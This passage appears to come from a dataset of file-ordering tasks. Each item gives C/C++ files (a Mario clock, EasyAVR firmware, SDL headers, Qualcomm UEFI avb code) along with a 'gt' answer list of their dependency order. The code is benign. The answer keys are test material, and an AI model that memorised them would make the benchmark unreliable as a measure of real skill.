};\n\n    Direction direction;\n\n    int _lastX;\n    int _lastY;\n\n    const unsigned short* _sprite;\n    unsigned long lastMillis = 0;\n    State _state = IDLE;\n    State _lastState = IDLE;\n\n    void idle();\n\n  public:\n    Mario(int x, int y);\n    void init();\n    void move(Direction dir, int times);\n    void jump();\n    void update();\n    const char* name();\n    void execute(EventType event, Sprite* caller);\n\n};\n\n\n#endif",
        "gt": [
            "'mariobros-clock/Sprite.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/mario.h'",
            "'mariobros-clock/Clockface.h'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/ASF/common/utils/interrupt.h'",
            "'EasyAVR/firmware/src/asf.h'",
            "'EasyAVR/firmware/src/main.c'",
            "'EasyAVR/firmware/src/ASF/mega/utils/compiler.h'"
        ],
        "content": "'EasyAVR/firmware/src/ASF/common/utils/interrupt.h'\n:\n\n#ifndef UTILS_INTERRUPT_H\n#define UTILS_INTERRUPT_H\n\n#include <parts.h>\n\n#if XMEGA || MEGA || TINY\n#  include \"interrupt/interrupt_avr8.h\"\n#elif UC3\n#  include \"interrupt/interrupt_avr32.h\"\n#elif SAM\n#  include \"interrupt/interrupt_sam_nvic.h\"\n#else\n#  error Unsupported device.\n#endif\n\n\n\n#if defined(__DOXYGEN__)\n\n#  define CONFIG_INTERRUPT_FORCE_INTC\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#endif\n\n'EasyAVR/firmware/src/asf.h'\n:\n\n#ifndef ASF_H\n#define ASF_H\n\n\n\n\n#include <user_board.h>\n\n\n#include <board.h>\n\n\n#include <interrupt.h>\n\n\n#include <LUFA/Common/Common.h>\n#include <LUFA/Version.h>\n\n\n#include <LUFA/Drivers/USB/USB.h>\n\n\n#include <compiler.h>\n#include <status_codes.h>\n\n\n#include <parts.h>\n\n#endif\n\n'EasyAVR/firmware/src/main.c'\n:\n\n\n#include <stddef.h>\n#include <stdint.h>\n#include <util/delay.h>\n\n\n#include <asf.h>\n\n\n#include \"debug.h\"\n#include \"lowlevel.h\"\n#include \"scheduler.h\"\n#include \"led.h\"\n#include \"matrix.h\"\n#include \"keymap.h\"\n#include \"mouse.h\"\n#include \"autokey.h\"\n#include \"nvm.h\"\n#include \"USB.h\"\n\n\nint main(void)\n{\n\n\tboard_init();\n\n\n\tinit_lowlevel();\n\tinit_debug();\n\tinit_nvm();\n\tinit_matrix();\n\tinit_led();\n\tinit_keymap();\n\tinit_mouse();\n\tinit_autokey();\n\tinit_scheduler();\n\tinit_USB();\n\n\n\tinitial_scan();\n\n\n\tUSB_Init();\n\n\n\tsei();\n\n\n\twhile (USB_DeviceState < DEVICE_STATE_Configured)\n\t\tUSB_service();\n\n\n\tschedule_start();\n\twhile (g_reset_requested == NO_RESET)\n\t\tUSB_service();\n\tschedule_stop();\n\n\n\tUSB_Disable();\n\n\n\tcli();\n\n\n\tDelay_MS(2000);\n\n\n\tif (g_reset_requested == RESET_TO_BOOT)\n\t\treset_to_bootloader();\n\n\n\tset_wdt_for_reset();\n\tfor (;;);\n}\n\n'EasyAVR/firmware/src/ASF/mega/utils/compiler.h'\n:\n\n#ifndef UTILS_COMPILER_H\n#define UTILS_COMPILER_H\n\n#if defined(__GNUC__)\n#\tinclude <avr/io.h>\n#elif defined(__ICCAVR__)\n#\tinclude <ioavr.h>\n#\tinclude <intrinsics.h>\n#else\n#\terror \"Unsupported compiler.\"\n#endif\n\n#include <stdbool.h>\n#include <stdint.h>\n#include <stddef.h>\n#include <stdlib.h>\n\n#include <parts.h>\n\n#ifdef __ICCAVR__\n\n\n#define __asm__              asm\n#define __inline__           inline\n#define __volatile__\n\n#endif\n\n\n#define UNUSED(v)          (void)(v)\n\n\n#define unused(v)          do { (void)(v); } while(0)\n\n\n#ifdef __GNUC__\n#  define barrier()        asm volatile(\"\" ::: \"memory\")\n#else\n#  define barrier()        asm (\"\")\n#endif\n\n\n#define COMPILER_PACK_RESET(alignment)\n#define COMPILER_PACK_SET(alignment)\n\n\n\n\n\n#if (defined __GNUC__)\n#\tdefine __always_inline   inline __attribute__((__always_inline__))\n#elif (defined __ICCAVR__)\n#\tdefine __always_inline   _Pragma(\"inline=forced\")\n#endif\n\n\n#if (defined __GNUC__)\n\t#define __always_optimize   __attribute__((optimize(3)))\n#elif (defined __ICCAVR__)\n\t#define __always_optimize   _Pragma(\"optimize=high\")\n#endif\n\n\n\n#if defined(_ASSERT_ENABLE_)\n#  if defined(TEST_SUITE_DEFINE_ASSERT_MACRO)\n\n#    include \"unit_test/suite.h\"\n#  else\n#    define Assert(expr) \\\n\t{\\\n\t\tif (!(expr)) while (true);\\\n\t}\n#  endif\n#else\n#  define Assert(expr) ((void) 0)\n#endif\n\n\n\n\n#define MSB(u16)             (((uint8_t* )&u16)[1])\n#define LSB(u16)             (((uint8_t* )&u16)[0])\n\n\n#include \"interrupt.h\"\n#include \"progmem.h\"\n\n#if (defined __GNUC__)\n  #define SHORTENUM                           __attribute__ ((packed))\n#elif (defined __ICCAVR__)\n  #define SHORTENUM\n#endif\n\n#if (defined __GNUC__)\n  #define FUNC_PTR                            void *\n#elif (defined __ICCAVR__)\n#if (FLASHEND > 0x1FFFF)\n  #define FUNC_PTR                            void __farflash *\n#else\n  #define FUNC_PTR                            void *\n#endif\n#endif\n\n\n#if (defined __GNUC__)\n  #define FLASH_DECLARE(x)                  const x __attribute__((__progmem__))\n#elif (defined __ICCAVR__)\n  #define FLASH_DECLARE(x)                  const __flash x\n#endif\n\n#if (defined __GNUC__)\n  #define FLASH_EXTERN(x) extern const x\n#elif (defined __ICCAVR__)\n  #define FLASH_EXTERN(x) extern const __flash x\n#endif\n\n\n\n#define CMD_ID_OCTET    (0)\n\n\n#define CPU_ENDIAN_TO_LE16(x)   (x)\n#define CPU_ENDIAN_TO_LE32(x)   (x)\n#define CPU_ENDIAN_TO_LE64(x)   (x)\n\n\n#define LE16_TO_CPU_ENDIAN(x)   (x)\n#define LE32_TO_CPU_ENDIAN(x)   (x)\n#define LE64_TO_CPU_ENDIAN(x)   (x)\n\n\n#define CLE16_TO_CPU_ENDIAN(x)  (x)\n#define CLE32_TO_CPU_ENDIAN(x)  (x)\n#define CLE64_TO_CPU_ENDIAN(x)  (x)\n\n\n#define CCPU_ENDIAN_TO_LE16(x)  (x)\n#define CCPU_ENDIAN_TO_LE32(x)  (x)\n#define CCPU_ENDIAN_TO_LE64(x)  (x)\n\n#if (defined __GNUC__)\n  #define ADDR_COPY_DST_SRC_16(dst, src)  memcpy((&(dst)), (&(src)), sizeof(uint16_t))\n  #define ADDR_COPY_DST_SRC_64(dst, src)  memcpy((&(dst)), (&(src)), sizeof(uint64_t))\n\n\n#define convert_byte_array_to_16_bit(data) \\\n    (*(uint16_t *)(data))\n\n\n#define convert_byte_array_to_32_bit(data) \\\n    (*(uint32_t *)(data))\n\n\n#define convert_byte_array_to_64_bit(data) \\\n    (*(uint64_t *)(data))\n\n\n#define convert_16_bit_to_byte_array(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_spec_16_bit_to_byte_array(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_16_bit_to_byte_address(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_32_bit_to_byte_array(value, data) \\\n    ((*(uint32_t *)(data)) = (uint32_t)(value))\n\n\n\n#define convert_64_bit_to_byte_array(value, data) \\\n    memcpy((data), (&(value)), sizeof(uint64_t))\n\n#elif (defined __ICCAVR__)\n  #define ADDR_COPY_DST_SRC_16(dst, src)  ((dst) = (src))\n  #define ADDR_COPY_DST_SRC_64(dst, src)  ((dst) = (src))\n\n\n#define convert_byte_array_to_16_bit(data) \\\n    (*(uint16_t *)(data))\n\n\n#define convert_byte_array_to_32_bit(data) \\\n    (*(uint32_t *)(data))\n\n\n#define convert_byte_array_to_64_bit(data) \\\n    (*(uint64_t *)(data))\n\n\n#define convert_16_bit_to_byte_array(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_spec_16_bit_to_byte_array(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_16_bit_to_byte_address(value, data) \\\n    ((*(uint16_t *)(data)) = (uint16_t)(value))\n\n\n#define convert_32_bit_to_byte_array(value, data) \\\n    ((*(uint32_t *)(data)) = (uint32_t)(value))\n\n\n#define convert_64_bit_to_byte_array(value, data) \\\n    ((*(uint64_t *)(data)) = (uint64_t)(value))\n#endif\n\n#define MEMCPY_ENDIAN memcpy\n#define PGM_READ_BLOCK(dst, src, len) memcpy_P((dst), (src), (len))\n\n#if (defined __GNUC__)\n  #define PGM_READ_BYTE(x) pgm_read_byte(x)\n  #define PGM_READ_WORD(x) pgm_read_word(x)\n#elif (defined __ICCAVR__)\n  #define PGM_READ_BYTE(x) *(x)\n  #define PGM_READ_WORD(x) *(x)\n#endif\n\n\ntypedef uint8_t                 U8 ;\ntypedef uint16_t                U16;\ntypedef uint32_t                U32;\ntypedef unsigned long long int  U64;\n\n\n#define Swap16(u16) ((U16)(((U16)(u16) >> 8) |\\\n                           ((U16)(u16) << 8)))\n\n\n#define Swap32(u32) ((U32)(((U32)Swap16((U32)(u32) >> 16)) |\\\n                           ((U32)Swap16((U32)(u32)) << 16)))\n\n\n#define Swap64(u64) ((U64)(((U64)Swap32((U64)(u64) >> 32)) |\\\n                           ((U64)Swap32((U64)(u64)) << 32)))\n\n#if (defined __GNUC__)\n  #define nop() do { __asm__ __volatile__ (\"nop\"); } while (0)\n#elif (defined __ICCAVR__)\n  #define nop() __no_operation()\n#endif\n\n#if (defined __GNUC__)\n#define FORCE_INLINE(type, name, ...) \\\n    static inline type name(__VA_ARGS__) __attribute__((always_inline)); \\\n    static inline type name(__VA_ARGS__)\n#elif (defined __ICCAVR__)\n#define FORCE_INLINE(type, name, ...) \\\n    PRAGMA(inline=forced) \\\n    static inline type name(__VA_ARGS__)\n#endif\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/ASF/common/utils/interrupt.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/compiler.h'",
            "'EasyAVR/firmware/src/asf.h'",
            "'EasyAVR/firmware/src/main.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'\n:\n\n\n\n#ifndef _SDL_gamecontroller_h\n#define _SDL_gamecontroller_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_joystick.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nstruct _SDL_GameController;\ntypedef struct _SDL_GameController SDL_GameController;\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_BINDTYPE_NONE = 0,\n    SDL_CONTROLLER_BINDTYPE_BUTTON,\n    SDL_CONTROLLER_BINDTYPE_AXIS,\n    SDL_CONTROLLER_BINDTYPE_HAT\n} SDL_GameControllerBindType;\n\n\ntypedef struct SDL_GameControllerButtonBind\n{\n    SDL_GameControllerBindType bindType;\n    union\n    {\n        int button;\n        int axis;\n        struct {\n            int hat;\n            int hat_mask;\n        } hat;\n    } value;\n\n} SDL_GameControllerButtonBind;\n\n\n\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerAddMappingsFromRW( SDL_RWops * rw, int freerw );\n\n\n#define SDL_GameControllerAddMappingsFromFile(file)   SDL_GameControllerAddMappingsFromRW(SDL_RWFromFile(file, \"rb\"), 1)\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerAddMapping( const char* mappingString );\n\n\nextern DECLSPEC char * SDLCALL SDL_GameControllerMappingForGUID( SDL_JoystickGUID guid );\n\n\nextern DECLSPEC char * SDLCALL SDL_GameControllerMapping( SDL_GameController * gamecontroller );\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IsGameController(int joystick_index);\n\n\n\nextern DECLSPEC const char *SDLCALL SDL_GameControllerNameForIndex(int joystick_index);\n\n\nextern DECLSPEC SDL_GameController *SDLCALL SDL_GameControllerOpen(int joystick_index);\n\n\nextern DECLSPEC SDL_GameController *SDLCALL SDL_GameControllerFromInstanceID(SDL_JoystickID joyid);\n\n\nextern DECLSPEC const char *SDLCALL SDL_GameControllerName(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_GameControllerGetAttached(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC SDL_Joystick *SDLCALL SDL_GameControllerGetJoystick(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerEventState(int state);\n\n\nextern DECLSPEC void SDLCALL SDL_GameControllerUpdate(void);\n\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_AXIS_INVALID = -1,\n    SDL_CONTROLLER_AXIS_LEFTX,\n    SDL_CONTROLLER_AXIS_LEFTY,\n    SDL_CONTROLLER_AXIS_RIGHTX,\n    SDL_CONTROLLER_AXIS_RIGHTY,\n    SDL_CONTROLLER_AXIS_TRIGGERLEFT,\n    SDL_CONTROLLER_AXIS_TRIGGERRIGHT,\n    SDL_CONTROLLER_AXIS_MAX\n} SDL_GameControllerAxis;\n\n\nextern DECLSPEC SDL_GameControllerAxis SDLCALL SDL_GameControllerGetAxisFromString(const char *pchString);\n\n\nextern DECLSPEC const char* SDLCALL SDL_GameControllerGetStringForAxis(SDL_GameControllerAxis axis);\n\n\nextern DECLSPEC SDL_GameControllerButtonBind SDLCALL\nSDL_GameControllerGetBindForAxis(SDL_GameController *gamecontroller,\n                                 SDL_GameControllerAxis axis);\n\n\nextern DECLSPEC Sint16 SDLCALL\nSDL_GameControllerGetAxis(SDL_GameController *gamecontroller,\n                          SDL_GameControllerAxis axis);\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_BUTTON_INVALID = -1,\n    SDL_CONTROLLER_BUTTON_A,\n    SDL_CONTROLLER_BUTTON_B,\n    SDL_CONTROLLER_BUTTON_X,\n    SDL_CONTROLLER_BUTTON_Y,\n    SDL_CONTROLLER_BUTTON_BACK,\n    SDL_CONTROLLER_BUTTON_GUIDE,\n    SDL_CONTROLLER_BUTTON_START,\n    SDL_CONTROLLER_BUTTON_LEFTSTICK,\n    SDL_CONTROLLER_BUTTON_RIGHTSTICK,\n    SDL_CONTROLLER_BUTTON_LEFTSHOULDER,\n    SDL_CONTROLLER_BUTTON_RIGHTSHOULDER,\n    SDL_CONTROLLER_BUTTON_DPAD_UP,\n    SDL_CONTROLLER_BUTTON_DPAD_DOWN,\n    SDL_CONTROLLER_BUTTON_DPAD_LEFT,\n    SDL_CONTROLLER_BUTTON_DPAD_RIGHT,\n    SDL_CONTROLLER_BUTTON_MAX\n} SDL_GameControllerButton;\n\n\nextern DECLSPEC SDL_GameControllerButton SDLCALL SDL_GameControllerGetButtonFromString(const char *pchString);\n\n\nextern DECLSPEC const char* SDLCALL SDL_GameControllerGetStringForButton(SDL_GameControllerButton button);\n\n\nextern DECLSPEC SDL_GameControllerButtonBind SDLCALL\nSDL_GameControllerGetBindForButton(SDL_GameController *gamecontroller,\n                                   SDL_GameControllerButton button);\n\n\n\nextern DECLSPEC Uint8 SDLCALL SDL_GameControllerGetButton(SDL_GameController *gamecontroller,\n                                                          SDL_GameControllerButton button);\n\n\nextern DECLSPEC void SDLCALL SDL_GameControllerClose(SDL_GameController *gamecontroller);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.c'\n:\n\n\n\n#include \"avb_sysdeps.h\"\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/DebugLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/ShutdownServices.h>\n\nint avb_memcmp(const void *src1, const void *src2, size_t n)\n{\n\treturn CompareMem(src1, src2, n);\n}\n\nvoid *avb_memcpy(void *dest, const void *src, size_t n)\n{\n\treturn CopyMem(dest, src, n);\n}\n\nvoid *avb_memset(void *dest, const int c, size_t n)\n{\n\treturn SetMem(dest, n, c);\n}\n\nint avb_strcmp(const char *s1, const char *s2)\n{\n\treturn AsciiStrCmp(s1, s2);\n}\n\nint Avb_StrnCmp (CONST CHAR8 *s1, CONST CHAR8 *s2, UINTN Len)\n{\n       return AsciiStrnCmp (s1, s2, Len);\n}\n\nsize_t avb_strlen(const char *str)\n{\n\treturn AsciiStrLen(str);\n}\n\nvoid avb_abort(void)\n{\n\tDEBUG((EFI_D_INFO, \"avb_abort!\"));\n\tShutdownDevice();\n}\n\nvoid avb_print(UINTN ErrorLevel, const char *message)\n{\n  DEBUG ((ErrorLevel, message));\n}\n\nvoid avb_printv(UINTN ErrorLevel, const char *message, ...)\n{\n\tVA_LIST ap;\n\tconst char *m;\n\n\tVA_START(ap, message);\n\tfor (m = message; m != NULL; m = VA_ARG(ap, const char *)) {\n      avb_print (ErrorLevel, m);\n\t}\n\tVA_END(ap);\n\treturn;\n}\n\nvoid *avb_malloc_(size_t size)\n{\n        return AllocateZeroPool (size);\n}\n\nvoid avb_free(void *ptr)\n{\n\tFreePool(ptr);\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'\n:\n\n#ifndef __BDS_INTERNAL_H__\n#define __BDS_INTERNAL_H__\n\n#include <PiDxe.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/HobLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PerformanceLib.h>\n#include <Library/PrintLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n\n#include <Protocol/DevicePath.h>\n#include <Protocol/DevicePathFromText.h>\n#include <Protocol/EFIResetReason.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadFile.h>\n#include <Protocol/PxeBaseCode.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Uefi.h>\n\n\ntypedef enum {\n\n  NORMAL_MODE = 0x0,\n  RECOVERY_MODE = 0x1,\n  FASTBOOT_MODE = 0x2,\n  ALARM_BOOT = 0x3,\n  DM_VERITY_LOGGING = 0x4,\n  DM_VERITY_ENFORCING = 0x5,\n  DM_VERITY_KEYSCLEAR = 0x6,\n  OEM_RESET_MIN = 0x20,\n  OEM_RESET_MAX = 0x3f,\n  EMERGENCY_DLOAD = 0xFF,\n} RebootReasonType;\n\ntypedef struct {\n  CHAR16 DataBuffer[12];\n  UINT8 Bdata;\n} __attribute ((__packed__)) ResetDataType;\n\n\nEFI_STATUS\nShutdownUefiBootServices (VOID);\n\nEFI_STATUS PreparePlatformHardware (VOID);\nVOID\nRebootDevice (UINT8 RebootReason);\nVOID ShutdownDevice (VOID);\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'\n:\n\n#ifndef __EFIRESETREASON_H__\n#define __EFIRESETREASON_H__\n\n\ntypedef struct _EFI_RESETREASON_PROTOCOL EFI_RESETREASON_PROTOCOL;\n\n\n\n\n#define EFI_RESETREASON_PROTOCOL_REVISION 0x0000000000010002\n\n\n\n\n#define EFI_RESETREASON_PROTOCOL_GUID                                          \\\n  {                                                                            \\\n    0xA022155A, 0x4828, 0x4535,                                                \\\n    {                                                                          \\\n      0xA4, 0x99,                                                              \\\n      {                                                                        \\\n        0x11, 0xF1, 0x52, 0x40, 0xB9, 0x1B                                     \\\n      }                                                                        \\\n    }                                                                          \\\n  }\n\n#define STR_RESET_PARAM L\"RESET_PARAM\"\n#define STR_RESET_UNKNOWN L\"UNKNOWN\"\n#define STR_RESET_PLAT_SPECIFIC_EDL L\"EDL\"\n\n\n\n\n\nextern EFI_GUID gEfiResetReasonProtocolGuid;\n\n\n\n\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_RESETREASON_GETRESETREASON) (\n    IN EFI_RESETREASON_PROTOCOL *This,\n    IN OUT UINT32 *ResetReason,\n    IN OUT CHAR16 *ResetReasonString OPTIONAL,\n    IN OUT UINT32 *ResetReasonStrLen OPTIONAL);\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_RESETREASON_CLEARRESETREASON) (\n    IN EFI_RESETREASON_PROTOCOL *This);\n\n\n\nstruct _EFI_RESETREASON_PROTOCOL {\n  UINT64 Revision;\n  EFI_RESETREASON_GETRESETREASON GetResetReason;\n  EFI_RESETREASON_CLEARRESETREASON ClearResetReason;\n};\n\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include 